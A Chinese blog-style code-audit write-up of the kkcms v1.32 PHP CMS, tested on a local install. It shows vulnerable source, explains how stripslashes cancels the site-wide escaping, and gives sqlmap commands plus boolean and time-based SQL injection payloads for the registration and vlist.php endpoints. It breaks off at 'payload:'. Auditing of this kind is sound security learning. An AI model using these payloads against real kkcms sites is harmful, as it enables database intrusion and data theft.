<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>继初次选择xhcms审计审计之后，对代码审计来了兴趣，一处处分析，经历失败，重来，最后找到漏洞点的过程确实很不错。因此，在喜欢xhcms审计结束后就马不停蹄找了个小众一点的cms再开启一次审计，熟悉熟悉，之后计划开始浮现tp,yii之类框架内容，且行且记吧。</p>
<p>[toc]</p>
<h2 data-content="1" id="263df20fb0bd699f6de34dd09a7acc96">审计过程</h2>
<h3 data-content="1" id="d71565d8b0f8bc78ca6a83e94c5297fb">一、环境安装</h3>
<p>直接去github搜一搜kkcms源码，我这里选择了较老的版本:</p>
<p><strong>kkcms-v1.32</strong></p>
<p>github源码地址：<a href="https://github.com/erichuang2015/kkcms" target="_blank">https://github.com/erichuang2015/kkcms</a></p>
<p>安装环境：</p>
<p>使用phpstudy 5.6.27+mysql5.5.53进行搭建（这个cms版本比较老，用php高版本会出问题）。下载后，源码解压到phpstudy根目录，启动phpstudy，访问并安装即可。</p>
<p><strong>ps:（安装时记得提前在phpstudy中mysql管理创建一个数据库（我这里创建一个kkcms数据库使用））</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161135-4fd645aa-cddd-1.png"/></p>
<p>出现这样的界面就安装完成了：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161158-5d7f46f2-cddd-1.png"/></p>
<h3 data-content="1" id="523c75c8f6e6d2a7d51fa26d9b8e3168">二、先看看目录结构，了解下整体情况</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161611-f4893efe-cddd-1.png"/></p>
<p>都是些常见目录结构，这里就不一一介绍了。先直接丢进seay审计工具中看一下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161625-fcda5c78-cddd-1.png"/></p>
<p>还不少，224个可疑点，那就以这个为线索，慢慢来看：</p>
<h3 data-content="1" id="6c92483605148f99d8ea10ef2db0b34f">三、漏洞</h3>
<h4 data-content="1" id="4a7c0d7446526a0efd9b881d57737a48">SQL注入</h4>
<h5 data-content="1" id="5538db6423dfd84d706264aef49ba9c0">ucenter/reg.php</h5>
<p>seay报警此文件存在sql注入漏洞，打开看一下代码：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
<span class="k">include</span><span class="p">(</span><span class="s1">'../system/inc.php'</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_name'</span><span class="p">])){</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'location:index.php'</span><span class="p">);</span>
<span class="p">};</span>  
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">])){</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]));</span>
<span class="c1">// 检测用户名是否存在</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select u_id from xtcms_user where u_name='</span><span class="si">$username</span><span class="s2">'"</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$query</span><span class="p">)){</span>
<span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("用户名已存在，请换个其他的用户名");window.history.go(-1);&lt;/script&gt;'</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'select * from xtcms_user where u_email = "'</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span><span class="o">.</span><span class="s1">'"'</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
<span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("邮箱已存在，请换个其他的邮箱");window.history.go(-1);&lt;/script&gt;'</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<ol>
<li><strong>stripslashes()函数</strong></li>
</ol>
<p>stripslashes() 函数删除由 <a href="https://www.runoob.com/php/func-string-addslashes.html" target="_blank">addslashes()</a> 函数添加的反斜杠。</p>
<p><strong>提示：</strong>该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</p>
<ol>
<li>
<p><strong>trim()函数</strong></p>
<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符（默认为NULL、\t、\n、\r、空格等）。</p>
</li>
</ol>
<p>$username变量经过stripslashes() 函数和trim()函数处理后，单引号包裹带入查询，那么有去除反斜杠，前面因该有addlashes()函数添加反斜杠才对：因此追踪包含文件，<strong>../system/inc.php</strong></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">require_once</span><span class="p">(</span><span class="s1">'conn.php'</span><span class="p">);</span>
<span class="k">require_once</span><span class="p">(</span><span class="s1">'library.php'</span><span class="p">);</span>
<span class="k">require_once</span><span class="p">(</span><span class="s1">'function.php'</span><span class="p">);</span>
<span class="k">require_once</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>一个个查看，最后在<strong>../system/library.php</strong>文件中看到：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">defined</span><span class="p">(</span><span class="s1">'PCFINAL'</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">exit</span><span class="p">(</span><span class="s1">'Request Error!'</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">get_magic_quotes_gpc</span><span class="p">())</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$_GET</span> <span class="o">=</span> <span class="nx">addslashes_deep</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$_POST</span> <span class="o">=</span> <span class="nx">addslashes_deep</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$_COOKIE</span> <span class="o">=</span> <span class="nx">addslashes_deep</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">);</span>
    <span class="nv">$_REQUEST</span> <span class="o">=</span> <span class="nx">addslashes_deep</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">addslashes_deep</span><span class="p">(</span><span class="nv">$_var_0</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_var_0</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$_var_0</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$_var_0</span><span class="p">)</span> <span class="o">?</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">'addslashes_deep'</span><span class="p">,</span> <span class="nv">$_var_0</span><span class="p">)</span> <span class="o">:</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_var_0</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>定义了addslashes_deep()方法对请求变量进行了转义处理，对预定义符号转义来防注入等攻击，但是。。。。问题来了，联系前面的ucenter/reg.php文件<strong>stripslashes()函数</strong>的处理，那不就是来了个负负得正吗？先添加转义，然后去除转义，带入查询，相当于没有进行防护，造成注入危险。</p>
<p>直接sqlmap一把梭：抓包保存，sqlmapPOST注入打一下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161647-09b7db3c-cdde-1.png"/></p>
<p>可以看到已经成功注入出了数据库，后续时间关系就不等他注完了</p>
<p>payload：</p>
<div class="highlight"><pre><span></span><span class="n">python2</span> <span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">r</span> <span class="n">D</span><span class="p">:</span><span class="err">\</span><span class="n">python27</span><span class="err">\</span><span class="n">sqlmap</span><span class="err">\</span><span class="n">aa</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">p</span> <span class="n">name</span> <span class="c1">--dbs --batch</span>
<span class="err">布尔：</span>
<span class="n">name</span><span class="o">=</span><span class="mi">1</span><span class="s1">' AND 2309=2309 AND '</span><span class="n">tslg</span><span class="s1">'='</span><span class="n">tslg</span><span class="o">&amp;</span><span class="n">email</span><span class="o">=</span><span class="mi">1</span><span class="o">@</span><span class="n">qq</span><span class="p">.</span><span class="n">com</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="mi">111</span><span class="o">&amp;</span><span class="n">submit</span><span class="o">=</span>
<span class="err">时间：</span>
<span class="n">name</span><span class="o">=</span><span class="mi">1</span><span class="s1">' AND (SELECT 3775 FROM (SELECT(SLEEP(5)))OXGU) AND '</span><span class="n">XUOn</span><span class="s1">'='</span><span class="n">XUOn</span><span class="o">&amp;</span><span class="n">email</span><span class="o">=</span><span class="mi">1</span><span class="o">@</span><span class="n">qq</span><span class="p">.</span><span class="n">com</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="mi">111</span><span class="o">&amp;</span><span class="n">submit</span><span class="o">=</span>
</pre></div>
<p>那么同样的思路，是不是所有引用了stripslashes()函数的地方都应该有同样的漏洞呢？想到就试试：全局搜索stripslashes()有：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161742-2b00d9ce-cdde-1.png"/></p>
<p>果然有发现，进去文件详细审查一下：</p>
<h5 data-content="1" id="01977df773f1ccaff66fef2235360ee6">ucenter/active.php</h5>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">include</span><span class="p">(</span><span class="s1">'../system/inc.php'</span><span class="p">);</span>
<span class="nv">$verify</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'verify'</span><span class="p">]));</span>
<span class="nv">$nowtime</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select u_id from xtcms_user where u_question='</span><span class="si">$verify</span><span class="s2">'"</span><span class="p">);</span>
<span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
</pre></div>
<h5 data-content="1" id="c9f59e59fa4fb4e2b327b085e24534e9">ucenter/repass.php</h5>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
<span class="k">include</span><span class="p">(</span><span class="s1">'../system/inc.php'</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_name'</span><span class="p">])){</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'location:index.php'</span><span class="p">);</span>
<span class="p">};</span>

<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">])){</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]));</span>
<span class="nv">$email</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]);</span>
<span class="c1">// 检测用户名是否存在</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select u_id from xtcms_user where u_name='</span><span class="si">$username</span><span class="s2">' and u_email='</span><span class="si">$email</span><span class="s2">'"</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="o">!!</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$query</span><span class="p">)){</span>
<span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_password'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="mi">123456</span><span class="p">);</span>
<span class="nv">$sql</span> <span class="o">=</span> <span class="s1">'update xtcms_user set '</span><span class="o">.</span><span class="nx">arrtoupdate</span><span class="p">(</span><span class="nv">$_data</span><span class="p">)</span><span class="o">.</span><span class="s1">' where u_name="'</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s1">'"'</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">))</span> <span class="p">{</span>
</pre></div>
<h5 data-content="1" id="b7965884172345cf8a4d00db0b7969a7">wap/login.php</h5>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="s1">'../system/inc.php'</span><span class="p">);</span>
<span class="nv">$op</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'op'</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">])){</span>
    <span class="nx">null_back</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'u_name'</span><span class="p">],</span><span class="s1">'请输入用户名'</span><span class="p">);</span>
    <span class="nx">null_back</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'u_password'</span><span class="p">],</span><span class="s1">'请输入密码'</span><span class="p">);</span>
    <span class="nv">$u_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'u_name'</span><span class="p">];</span>
    <span class="nv">$u_password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'u_password'</span><span class="p">];</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">'select * from xtcms_user where u_name = "'</span><span class="o">.</span><span class="nv">$u_name</span><span class="o">.</span><span class="s1">'" and u_password = "'</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$u_password</span><span class="p">)</span><span class="o">.</span><span class="s1">'" and u_status=1'</span><span class="p">;</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!!</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>

    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_loginnum'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'u_loginnum'</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span> 
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_loginip'</span><span class="p">]</span> <span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">];</span> 
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_logintime'</span><span class="p">]</span> <span class="o">=</span><span class="nb">date</span><span class="p">(</span><span class="s1">'y-m-d h:i:s'</span><span class="p">,</span><span class="nb">time</span><span class="p">());</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'u_end'</span><span class="p">]))</span> <span class="nv">$u_end</span><span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'u_end'</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">time</span><span class="p">()</span><span class="o">&gt;</span><span class="nv">$u_end</span><span class="p">){</span>
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_flag'</span><span class="p">]</span> <span class="o">==</span><span class="s2">"0"</span><span class="p">;</span>
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_start'</span><span class="p">]</span> <span class="o">==</span><span class="s2">""</span><span class="p">;</span>
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_end'</span><span class="p">]</span> <span class="o">==</span><span class="s2">""</span><span class="p">;</span>
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_group'</span><span class="p">]</span> <span class="o">=</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_flag'</span><span class="p">]</span> <span class="o">==</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"u_flag"</span><span class="p">];</span>
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_start'</span><span class="p">]</span> <span class="o">==</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"u_start"</span><span class="p">];</span>
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_end'</span><span class="p">]</span> <span class="o">==</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"u_end"</span><span class="p">];</span>
    <span class="nv">$_data</span><span class="p">[</span><span class="s1">'u_group'</span><span class="p">]</span> <span class="o">=</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"u_group"</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'update xtcms_user set '</span><span class="o">.</span><span class="nx">arrtoupdate</span><span class="p">(</span><span class="nv">$_data</span><span class="p">)</span><span class="o">.</span><span class="s1">' where u_id ="'</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'u_id'</span><span class="p">]</span><span class="o">.</span><span class="s1">'"'</span><span class="p">);</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_name'</span><span class="p">]</span><span class="o">=</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'u_name'</span><span class="p">];</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_group'</span><span class="p">]</span><span class="o">=</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'u_group'</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'brand1'</span><span class="p">]){</span> 
<span class="nb">setcookie</span><span class="p">(</span><span class="s1">'user_name'</span><span class="p">,</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'u_name'</span><span class="p">],</span><span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">365</span><span class="p">);</span> 
<span class="nb">setcookie</span><span class="p">(</span><span class="s1">'user_password'</span><span class="p">,</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'u_password'</span><span class="p">],</span><span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">365</span><span class="p">);</span> 
<span class="p">}</span> 
        <span class="nb">header</span><span class="p">(</span><span class="s1">'location:user.php'</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="nx">alert_href</span><span class="p">(</span><span class="s1">'用户名或密码错误或者尚未激活'</span><span class="p">,</span><span class="s1">'login.php?op=login'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'reg'</span><span class="p">])){</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]));</span>
<span class="c1">// 检测用户名是否存在</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">"select u_id from xtcms_user where u_name='</span><span class="si">$username</span><span class="s2">'"</span><span class="p">);</span>
</pre></div>
<p>这三个文件中都引用了同一个<strong>../system/inc.php</strong>文件，即用addslashes_deep()方法进行变量转义处理防注入，且可控变量都同样经过stripslashes()逆转义处理，也就是同样的“<strong>负负得正</strong>”，因此，这三个文件中都一定存在如上的sql注入漏洞。这里就不进行重复造轮子去复现了。</p>
<h5 data-content="1" id="f978a3ce3c22980a4f47140349930a58">template/wapian/vlist.php</h5>
<p>seay报sql注入，打开代码瞧瞧，关键处：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cid'</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
    <span class="cp">?&gt;</span><span class="x">                      </span>
<span class="cp">&lt;?php</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'select * from xtcms_vod_class where c_pid='</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cid'</span><span class="p">]</span><span class="o">.</span><span class="s1">' order by c_sort desc,c_id asc'</span><span class="p">);</span>
<span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>

            <span class="k">echo</span> <span class="s1">'&lt;a href="./vlist.php?cid='</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'c_id'</span><span class="p">]</span><span class="o">.</span><span class="s1">'" class="acat" style="white-space: pre-wrap;margin-bottom: 4px;"&gt;'</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'c_name'</span><span class="p">]</span><span class="o">.</span><span class="s1">'&lt;/a&gt;'</span><span class="p">;</span>
        <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>这里对<strong>$_GET['cid']</strong>变量进行一个判断，不为零就直接单引号包裹带入查询中，这简直就是没有任何防护，那么，根据前面的经验，只要没有引用<strong>../system/inc.php</strong>文件，即用addslashes_deep()方法进行变量转义处理防注入，那么不久可以直接开始注入了？看看去：</p>
<div class="highlight"><pre><span></span><span class="x">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span>
<span class="x">&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;</span>
<span class="x">&lt;head&gt;</span>
<span class="cp">&lt;?php</span>  <span class="k">include</span> <span class="s1">'head.php'</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&lt;title&gt;视频列表-</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$xtcms_seoname</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">&lt;/title&gt;</span>
<span class="x">&lt;meta name="keywords" content="视频排行,</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$xtcms_keywords</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">"&gt;</span>
<span class="x">&lt;meta name="description" content="</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$xtcms_description</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">"&gt;</span>
<span class="x">&lt;/head&gt;</span>
<span class="x">&lt;body &gt;</span>
<span class="cp">&lt;?php</span> <span class="k">include</span> <span class="s1">'header.php'</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&lt;div class="container"&gt;</span>
<span class="x">&lt;div class="row"  style="margin-top:10px"&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">get_ad</span><span class="p">(</span><span class="mi">18</span><span class="p">)</span><span class="cp">?&gt;</span><span class="x">&lt;/div&gt;</span>
<span class="x">    &lt;div class="row"&gt;</span>
</pre></div>
<p>向上查找，到文件头，果然没有发现任何引用<strong>../system/inc.php</strong>文件的迹象，hahaha,注入到手咯，实现一下：</p>
<p>直接访问文件路径，截取GET变量cid,sqlmap梭一把，</p>
<div class="highlight"><pre><span></span><span class="n">python2</span> <span class="n">sqlmap</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s2">"http://127.0.0.1/template/wapian/vlist.php?cid=1"</span> <span class="o">--</span><span class="n">dbs</span> <span class="o">--</span><span class="n">batch</span>
</pre></div>
<p>直接出结果，下一个</p>
<h5 data-content="1" id="155c9f3462691197e2df45bc540d91f5">admin/cms_backup.php</h5>
<p>seay报注入漏洞，我们先看看关键代码：</p>
<div class="highlight"><pre><span></span><span class="x">$q1=mysql_query("show tables");</span>
<span class="x">while($t=mysql_fetch_array($q1)){</span>
<span class="x">  $table=$t[0];</span>
<span class="x">  $q2=mysql_query("show create table `$table`");</span>
<span class="x">  $sql=mysql_fetch_array($q2);</span>
<span class="x">  $mysql.=$sql['Create Table'].";\r\n";</span>
<span class="x">  $q3=mysql_query("select * from `$table`");</span>
<span class="x">  while($data=mysql_fetch_assoc($q3)){</span>
<span class="x">    $keys=array_keys($data);</span>
<span class="x">    $keys=array_map('addslashes',$keys);</span>
<span class="x">    $keys=join('`,`',$keys);</span>
<span class="x">    $keys="`".$keys."`";</span>
<span class="x">    $vals=array_values($data);</span>
<span class="x">    $vals=array_map('addslashes',$vals);</span>
<span class="x">    $vals=join("','",$vals);</span>
<span class="x">    $vals="'".$vals."'";</span>
<span class="x">    $mysql.="insert into `$table`($keys) values($vals);\r\n";</span>
<span class="x">  }</span>
<span class="x">}</span>
</pre></div>
<p><strong>array_map() 函数</strong></p>
<p>将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新的值的数组。</p>
<p><strong>提示：</strong>您可以向函数输入一个或者多个数组。array_map(<em>myfunction,array1,array2,array3</em>...)</p>
<p>可以看到，$vals变量经过<strong>array_map() 函数</strong>处理后，全部经过了addlashes()转义处理来防止注入(<strong>addslashes() 函数返回在预定义字符(单·双引号、反斜杠（\）、NULL)之前添加反斜杠的字符串。</strong>)，之后经过<strong>$vals="'".$vals."'";</strong>语句处理，添加单引号包裹，就完全杜绝了sql注入的可能性，无法构造闭合。（<strong>ps:</strong>要是这里没有添加单引号，此处语句括号闭合不在该函数的预定义字符内，则就实际上等于没有防护到，还是可以注入，十分可惜）。另一个变量<strong>$keys</strong>几乎是一样的情况，甚至防护更严格，因此也不存在注入，综上，此处属于seay的误报。</p>
<p>不纠结，下一处：</p>
<h5 data-content="1" id="e19433e04e166c95ba171121a0e966e6">/template/wapian/vlist.php</h5>
<p>直接看关键代码：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cid'</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
    <span class="cp">?&gt;</span><span class="x">                  </span>
<span class="cp">&lt;?php</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'select * from xtcms_vod_class where c_pid='</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cid'</span><span class="p">]</span><span class="o">.</span><span class="s1">' order by c_sort desc,c_id asc'</span><span class="p">);</span>
<span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">echo</span> <span class="s1">'&lt;a href="./vlist.php?cid='</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'c_id'</span><span class="p">]</span><span class="o">.</span><span class="s1">'" class="acat" style="white-space: pre-wrap;margin-bottom: 4px;"&gt;'</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'c_name'</span><span class="p">]</span><span class="o">.</span><span class="s1">'&lt;/a&gt;'</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>对$_GET['cid']变量，不经过滤，直接单引号包裹，文件头没有引入转义函数文件，带入查询，典型的sql注入：sql注入（但是这里审计出来的代码闭合方式应该是单引号闭合，但是测试却失败了，这是怎么回事？）sqlmap跑一下看看：</p>
<div class="highlight"><pre><span></span><span class="n">python2</span> <span class="n">sqlmap</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s2">"http://127.0.0.1/template/wapian/vlist.php?cid=1"</span> <span class="o">--</span><span class="n">dbs</span> <span class="o">--</span><span class="n">batch</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507161910-5f0641e6-cdde-1.png"/></p>
<p>可以看到，注出了数据库，payload:</p>
